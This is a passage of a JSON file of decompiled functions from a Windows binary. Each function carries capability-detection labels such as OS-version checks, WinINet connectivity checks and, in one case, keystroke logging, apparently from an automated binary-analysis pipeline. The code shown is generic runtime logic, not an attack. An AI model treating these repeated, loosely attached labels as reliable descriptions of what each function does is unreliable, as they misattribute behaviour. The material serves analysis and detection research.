        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __fastcall fcn.0041161c(uint param_1, uint *param_2)\n\n{\n    bool bVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_1h;\n    \n    if (((*0x4962a4 == 0) || (in_AX < 0x100)) || (0x7ff < in_AX)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        uStack24 = 0x4962a8;\n        puStack28 = 0x411657;\n        sub.kernel32.dll_EnterCriticalSection();\n        uStack32 = 0x4116c4;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &fcn.0041161c::var_1h + 1;\n        iVar2 = fcn.00405c9c();\n        if (in_AX - 0x100 < iVar2) {\n            *param_2 = *(*0x4962a4 + -0x400 + in_AX * 4);\n        }\n        *in_FS_OFFSET = uStack36;\n        puStack28 = 0x4116cb;\n        uStack32 = 0x4962a8;\n        uStack36 = 0x4116c3;\n        uVar3 = sub.kernel32.dll_LeaveCriticalSection();\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 387
    },
    "004119c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint fcn.004119c4(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*in_EAX == '\\x01') {\n        uVar2 = fcn.00408ec4();\n        return uVar2;\n    }\n    iVar3 = fcn.0041196c();\n    if (*(iVar3 + 1) < 0) {\n        cVar1 = fcn.00408b5c();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.00408b5c();\n            if (cVar1 == '\\0') {\n                uVar2 = fcn.00408ec4();\n            }\n            else {\n                uVar2 = 0xffffffff;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = fcn.00411978();\n    }\n    return uVar2;\n}\n",
        "token_count": 218
    },
    "00411a98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411a98(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    \n    puVar4 = param_2;\n    for (uVar2 = *(in_EAX + 10 + *(in_EAX + 1)); uVar2 != 0; uVar2 = uVar2 - 1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    while( true ) {\n        iVar1 = in_EAX + 2 + (uVar2 & 0xffffff00 | *(in_EAX + 1));\n        uVar3 = uVar2 & 0xffffff00 | *(iVar1 + 10);\n        uVar2 = *(iVar1 + 0xb + uVar3);\n        if (uVar2 != 0) {\n            iVar5 = iVar1 + 0xd + uVar3;\n            do {\n                uVar3 = uVar3 & 0xffffff00 | *(iVar5 + 0x1a);\n                if (param_2[*(iVar5 + 0x18)] == 0) {\n                    param_2[*(iVar5 + 0x18)] = iVar5;\n                }\n                iVar5 = iVar5 + 0x1b + uVar3;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        uVar2 = 0;\n        if (*(iVar1 + 4) == NULL) break;\n        in_EAX = **(iVar1 + 4);\n    }\n    return;\n}\n",
        "token_count": 393
    },
    "00411aec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00411aec(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    \n    pcVar1 = **param_2;\n    uVar5 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar5 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[1];\n    if (*(param_2 + 7) < 0xfe) {\n        uVar3 = (*pcVar2)();\n    }\n    else if (*(param_2 + 7) == 0xff) {\n        puVar4 = (pcVar2 & 0xffffff) + in_EAX;\n        uVar3 = in_EAX & 0xffffff00 | *puVar4;\n        if ((1 < uVar5) && (uVar3 = in_EAX & 0xffff0000 | *puVar4,  3 < uVar5)) {\n            uVar3 = *puVar4;\n        }\n    }\n    else {\n        uVar3 = (**(pcVar2 + *in_EAX))();\n    }\n    if (uVar5 < 4) {\n        if (uVar5 < 2) {\n            uVar3 = uVar3;\n            if (uVar5 != 0) {\n                return uVar3 & 0xff;\n            }\n        }\n        else {\n            uVar3 = uVar3;\n            if (uVar5 != 2) {\n                uVar3 = uVar3 & 0xffff;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 397
    },
    "00411b60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411b60(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    uint8_t uVar4;\n    \n    pcVar1 = **param_2;\n    uVar4 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar4 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar2 & 0xffffff);\n        *puVar3 = param_1;\n        if ((1 < uVar4) && (*puVar3 = param_1,  3 < uVar4)) {\n            *puVar3 = param_1;\n        }\n    }\n    else if (*(param_2 + 0xb) < 0xfe) {\n        (*pcVar2)();\n    }\n    else {\n        (**(pcVar2 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00413c14": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413c14(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    if (in_EDX == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00413bb4();\n    }\n    if (in_ECX == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.00413bb4();\n    }\n    if ((iVar1 != 0) && (iVar2 != 0)) {\n        fcn.00404184();\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "00413c84": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00413c84(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 0xc) = uVar1;\n    fcn.00414d8c();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 202
    },
    "00413dcc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00413dcc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack288 = 0x413e7c;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack292;\n    fcn.00403e38();\n    fcn.00405004();\n    iVar1 = fcn.00413d20();\n    if (iVar1 != 0) {\n        var_10ch = var_4h;\n        var_108h._0_1_ = 0xb;\n        in_stack_fffffed4 = 0;\n        fcn.0040c6a4(0, &var_10ch);\n        fcn.004047cc();\n    }\n    if (*(in_EAX + 4) == 0) {\n        uVar2 = fcn.00403f28();\n        *(in_EAX + 4) = uVar2;\n    }\n    fcn.00414d8c();\n    *in_FS_OFFSET = in_stack_fffffed4;\n    uStack292 = 0x413e83;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 357
    },
    "00413ed0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00413ed0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0xc) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.00414eec();\n            cVar1 = fcn.00413eb0();\n            if (cVar1 != '\\0') {\n                fcn.00414dd8();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if ((*(in_EAX + 4) != 0) && (iVar2 = *(*(in_EAX + 4) + 8) + -1,  -1 < iVar2)) {\n        do {\n            fcn.00414eec();\n            cVar1 = fcn.00413eb0();\n            if (cVar1 != '\\0') {\n                fcn.00414dd8();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if (*(in_EAX + 8) != NULL) {\n        iVar2 = (**(**(in_EAX + 8) + 0x14))();\n        iVar2 = iVar2 + -1;\n        if (-1 < iVar2) {\n            do {\n                (**(**(in_EAX + 8) + 0x18))();\n                cVar1 = fcn.00413eb0();\n                if (cVar1 != '\\0') {\n                    (**(**(in_EAX + 8) + 0x48))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != -1);\n        }\n    }\n    return;\n}\n",
        "token_count": 393
    },
    "004140e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004140e0(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.00414eec();\n            if (*(iVar1 + 0x10) != '\\0') {\n                iVar3 = fcn.00413d20();\n            }\n        } while ((iVar3 == 0) && (iVar2 = iVar2 + -1,  iVar2 != 0));\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 174
    },
    "004141b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004141b4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.0041409c();\n    if (iVar2 == 0) {\n        fcn.00414124(&stack0xfffffffc);\n    }\n    fcn.00413ba8();\n    var_18h = *(*(in_EAX + 4) + 8);\n    if (-1 < var_18h + -1) {\n        do {\n            iVar3 = fcn.00414eec();\n            if (((iVar3 != iVar2) && (*(iVar3 + 4) != 0)) && (iVar3 = *(*(iVar3 + 4) + 8) + -1,  -1 < iVar3)) {\n                do {\n                    fcn.00414eec();\n                    cVar1 = fcn.00404184();\n                    if ((cVar1 != '\\0') && (iVar4 = fcn.0041409c(),  iVar4 == iVar2)) {\n                        fcn.00414dd8();\n                        fcn.00414d8c();\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "00414344": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00414344(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            iVar1 = fcn.00414eec();\n            fcn.00413ed0();\n            if (*(*(iVar1 + 0xc) + 8) == 0) {\n                fcn.00403f58();\n                fcn.00414dd8();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00414394": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414394(uint arg_8h)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    char in_DL;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (in_DL != '\\0') {\n        puStack48 = 0x4143a9;\n        in_EAX = fcn.0040427c();\n    }\n    puStack48 = 0x4143bc;\n    fcn.00403f28();\n    puStack48 = 0x4143c8;\n    uVar3 = fcn.00403f28();\n    *(in_EAX + 4) = uVar3;\n    puStack48 = 0x4143d8;\n    fcn.00414280();\n    uStack52 = 0x414493;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar5 = *(*(*0x4962d8 + 4) + 8);\n    puStack48 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar5 + -1) {\n        do {\n            puStack48 = puVar1;\n            fcn.00414eec();\n            cVar2 = fcn.00413d88();\n            if (cVar2 != '\\0') {\n                fcn.00414d8c();\n            }\n            iVar5 = iVar5 + -1;\n            puVar1 = puStack48;\n        } while (iVar5 != 0);\n    }\n    if ((arg_8h != '\\0') && (iVar5 = *(*(*0x4962d8 + 4) + 8),  -1 < iVar5 + -1)) {\n        do {\n            iVar4 = fcn.00414eec();\n            if (*(iVar4 + 0x10) != '\\0') {\n                fcn.00414d8c();\n            }\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x41449a;\n    uStack52 = 0x414492;\n    fcn.00414338();\n    return;\n}\n",
        "token_count": 549
    },
    "004144f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.004144f0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x41450d;\n    fcn.00414280();\n    uStack32 = 0x414567;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00414eec();\n            iVar1 = fcn.00413d20();\n            if (iVar1 != 0) {\n                fcn.00404878();\n                return iVar1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41456e;\n    uStack32 = 0x414566;\n    iVar2 = fcn.00414338();\n    return iVar2;\n}\n",
        "token_count": 290
    },
    "004148d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004148d8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4148f0;\n    iVar1 = fcn.004152b4();\n    uStack28 = 0x414942;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack24 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00414eec();\n            if (in_EAX == *(iVar2 + 4)) {\n                uVar3 = *(iVar2 + 8);\n                fcn.00404878();\n                return uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x414949;\n    uStack28 = 0x414941;\n    uVar3 = fcn.00415318();\n    return uVar3;\n}\n",
        "token_count": 298
    },
    "00414a18": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00414a18(void)\n\n{\n    if (*0x4962dc != 0) {\n        fcn.00415088();\n    }\n    return;\n}\n",
        "token_count": 39
    },
    "00414a30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00414a30(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    iVar1 = 0;\n    if ((*0x4962dc != 0) && (iVar3 = *(*0x4962dc + 8) + -1,  -1 < iVar3)) {\n        do {\n            pcVar2 = fcn.00414eec();\n            iVar1 = (*pcVar2)();\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 151
    },
    "00414a70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.00414a70(void)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x4962c8 != NULL) {\n        uVar1 = (**0x4962c8)();\n        return uVar1;\n    }\n    uVar1 = fcn.00414a30();\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 89
    },
    "00414ba0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00414ba0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    fcn.00406b88();\n    fcn.00403f58();\n    iVar1 = fcn.00406b88();\n    iVar1 = *(iVar1 + 0xc);\n    uVar2 = fcn.00414fd4();\n    iVar3 = fcn.00406b88();\n    *(iVar3 + 8) = uVar2;\n    fcn.00414dd8();\n    if (*(iVar1 + 8) == 0) {\n        iVar1 = fcn.00406b88();\n        *(iVar1 + 0xc) = 0;\n        fcn.00403f58();\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00414ca4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414ca4(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    char var_ah;\n    uchar var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    puStack20 = 0x414cba;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    (**(**0x4962c4 + 0x14))();\n    uStack24 = 0x414d52;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    var_ah = *0x414d68 == (*(var_4h + 0x1c) & *0x414d64);\n    puStack20 = &stack0xfffffffc;\n    if (var_ah) {\n        puStack32 = 0x414cef;\n        puStack20 = &stack0xfffffffc;\n        fcn.00414b18();\n    }\n    uStack36 = 0x414d33;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00403e30();\n    var_9h = fcn.00414bfc(arg_8h);\n    if (var_ah != '\\0') {\n        fcn.00414b70();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x414d3a;\n    if (var_ah != '\\0') {\n        uStack36 = 0x414d32;\n        fcn.00414ba0();\n    }\n    return;\n}\n",
        "token_count": 447
    },
    "0041522c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041522c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x41523e;\n    fcn.004152b4();\n    uStack20 = 0x4152a8;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0x20) != '\\x01') {\n        puStack16 = &stack0xfffffffc;\n        iVar1 = fcn.00414f48();\n        if (iVar1 != -1) {\n            if (*(in_EAX + 0x20) == '\\x02') {\n                fcn.00414e78();\n            }\n            goto code_r0x00415292;\n        }\n    }\n    fcn.00414d8c();\ncode_r0x00415292:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4152af;\n    uStack20 = 0x4152a7;\n    fcn.00415318();\n    return;\n}\n",
        "token_count": 288
    },
    "00415378": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415378(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (param_2 < 0) {\n            fcn.00415354(param_1);\n        }\n        iVar1 = param_2 + 0x1f;\n        if (iVar1 < 0) {\n            iVar1 = param_2 + 0x3e;\n        }\n        iVar1 = (iVar1 >> 5) * 4;\n        iVar2 = *(in_EAX + 4) + 0x1f;\n        if (iVar2 < 0) {\n            iVar2 = *(in_EAX + 4) + 0x3e;\n        }\n        iVar2 = (iVar2 >> 5) * 4;\n        if (iVar2 != iVar1) {\n            iVar3 = 0;\n            if (iVar1 != 0) {\n                iVar3 = fcn.00402ce4();\n                fcn.00403720();\n            }\n            if (iVar2 != 0) {\n                if (iVar3 != 0) {\n                    fcn.0041536c();\n                    fcn.00402ee0();\n                }\n                fcn.00402d00();\n            }\n            *(in_EAX + 8) = iVar3;\n        }\n        *(in_EAX + 4) = param_2;\n    }\n    return;\n}\n",
        "token_count": 348
    },
    "0041541c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041541c(char param_1, uint32_t param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) <= param_2) {\n        if (param_2 < 0) {\n            fcn.0040c668();\n            fcn.004047cc();\n            return;\n        }\n        fcn.00415378();\n    }\n    if (param_1 != '\\0') {\n        puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n        *puVar1 = *puVar1 | '\\x01' << (param_2 & 7);\n        return;\n    }\n    puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n    *puVar1 = *puVar1 & ~('\\x01' << (param_2 & 7));\n    return;\n}\n",
        "token_count": 214
    },
    "004155f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041565d)\n\nvoid fcn.004155f4(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x415689;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00403e38();\n    fcn.00405004();\n    iVar1 = fcn.00404154();\n    if (iVar1 != 0) {\n        fcn.00404154();\n        fcn.00404154();\n    }\n    *in_FS_OFFSET = in_stack_fffffed4;\n    fcn.00404da0(0x415690);\n    return;\n}\n",
        "token_count": 215
    },
    "004156f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004156f8(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 4))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "00415718": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
